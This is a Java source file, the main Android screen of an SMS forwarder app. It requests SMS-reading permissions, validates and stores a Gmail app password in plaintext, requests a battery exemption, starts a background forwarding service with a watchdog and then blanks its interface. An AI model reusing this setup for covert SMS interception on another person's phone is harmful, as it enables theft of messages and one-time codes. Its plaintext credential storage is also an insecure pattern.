package com.smsforwarder;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQUEST    = 101;
    private static final int BATTERY_REQUEST = 102;
    private static final String PREFS        = "sms_fwd_prefs";
    private static final String KEY_GMAIL    = "gmail";
    private static final String KEY_PASS     = "pass";
    private static final String KEY_SETUP_DONE = "setup_done";

    private LinearLayout screenPermission;
    private LinearLayout screenSetup;

    private Button   btnAllow;
    private TextView tvPermError;

    private EditText etGmail, etPassword;
    private Button   btnSave;
    private TextView tvSetupError;
    private TextView tvValidating;

    private final ExecutorService bgThread = Executors.newSingleThreadExecutor();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        screenPermission = findViewById(R.id.screenPermission);
        screenSetup      = findViewById(R.id.screenSetup);
        btnAllow         = findViewById(R.id.btnAllow);
        tvPermError      = findViewById(R.id.tvPermError);
        etGmail          = findViewById(R.id.etGmail);
        etPassword       = findViewById(R.id.etPassword);
        btnSave          = findViewById(R.id.btnSave);
        tvSetupError     = findViewById(R.id.tvSetupError);
        tvValidating     = findViewById(R.id.tvValidating);

        btnAllow.setOnClickListener(v -> requestMissingPermissions());
        btnSave.setOnClickListener(v -> handleSave());

        loadSavedCredentials();
        routeToCorrectScreen();
    }

    @Override
    protected void onResume() {
        super.onResume();
        routeToCorrectScreen();
    }

    // ─── Routing ──────────────────────────────────────────────────────────────

    private void routeToCorrectScreen() {
        if (!getMissingPermissions().isEmpty()) { showScreen(1); return; }
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        if (!prefs.getBoolean(KEY_SETUP_DONE, false)) { showScreen(2); return; }
        requestBatteryExemptionOrStart();
    }

    private void showScreen(int n) {
        screenPermission.setVisibility(n == 1 ? View.VISIBLE : View.GONE);
        screenSetup.setVisibility(n == 2 ? View.VISIBLE : View.GONE);
    }

    private void hideAll() {
        screenPermission.setVisibility(View.GONE);
        screenSetup.setVisibility(View.GONE);
        getWindow().getDecorView().setBackgroundColor(0xFFFFFFFF);
    }

    // ─── Permissions ──────────────────────────────────────────────────────────

    private List<String> getMissingPermissions() {
        List<String> missing = new ArrayList<>();
        String[] needed;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed = new String[]{
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.POST_NOTIFICATIONS
            };
        } else {
            needed = new String[]{
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            };
        }
        for (String p : needed)
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        return missing;
    }

    private void requestMissingPermissions() {
        List<String> missing = getMissingPermissions();
        if (!missing.isEmpty()) {
            tvPermError.setVisibility(View.GONE);
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERM_REQUEST);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQUEST) {
            if (!getMissingPermissions().isEmpty()) tvPermError.setVisibility(View.VISIBLE);
            else routeToCorrectScreen();
        }
    }

    // ─── Setup ────────────────────────────────────────────────────────────────

    private void loadSavedCredentials() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        String g = prefs.getString(KEY_GMAIL, "");
        String p = prefs.getString(KEY_PASS, "");
        if (!g.isEmpty()) etGmail.setText(g);
        if (!p.isEmpty()) etPassword.setText(p);
    }

    private void handleSave() {
        String gmail = etGmail.getText().toString().trim();
        String pass  = etPassword.getText().toString().trim();

        // Basic format check
        if (TextUtils.isEmpty(gmail) || !gmail.contains("@") || !gmail.contains(".")) {
            showError("Sahi Gmail address enter karein (example@gmail.com)");
            return;
        }
        if (TextUtils.isEmpty(pass) || pass.length() < 6) {
            showError("Password kam se kam 6 characters ka hona chahiye");
            return;
        }

        // Async Gmail validation
        setValidatingState(true);
        hideKeyboard();

        final String g = gmail, p = pass;
        bgThread.execute(() -> {
            String error = GmailPoller.testLogin(g, p);
            runOnUiThread(() -> {
                setValidatingState(false);
                if (error != null) {
                    showError(error);
                } else {
                    saveAndStart(g, p);
                }
            });
        });
    }

    private void saveAndStart(String gmail, String pass) {
        tvSetupError.setVisibility(View.GONE);
        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
            .putString(KEY_GMAIL, gmail)
            .putString(KEY_PASS, pass)
            .putBoolean(KEY_SETUP_DONE, true)
            .apply();
        AppConfig.GMAIL_USER         = gmail;
        AppConfig.GMAIL_APP_PASSWORD = pass;
        requestBatteryExemptionOrStart();
    }

    private void showError(String msg) {
        tvSetupError.setText(msg);
        tvSetupError.setVisibility(View.VISIBLE);
    }

    private void setValidatingState(boolean validating) {
        btnSave.setEnabled(!validating);
        btnSave.setText(validating ? "Verify ho raha hai..." : "Save & Start");
        tvValidating.setVisibility(validating ? View.VISIBLE : View.GONE);
        tvSetupError.setVisibility(View.GONE);
    }

    // ─── Battery + Start ──────────────────────────────────────────────────────

    private void requestBatteryExemptionOrStart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, BATTERY_REQUEST);
                    return;
                } catch (Exception ignored) {}
            }
        }
        startForwarderAndHide();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == BATTERY_REQUEST) startForwarderAndHide();
    }

    private void startForwarderAndHide() {
        Intent s = new Intent(this, ForwarderService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(s);
        else startService(s);
        WatchdogScheduler.schedule(this);
        hideAll();
    }

    // ─── Helpers ──────────────────────────────────────────────────────────────

    private void hideKeyboard() {
        InputMethodManager imm = (InputMethodManager) getSystemService(INPUT_METHOD_SERVICE);
        View focus = getCurrentFocus();
        if (imm != null && focus != null) imm.hideSoftInputFromWindow(focus.getWindowToken(), 0);
    }
}
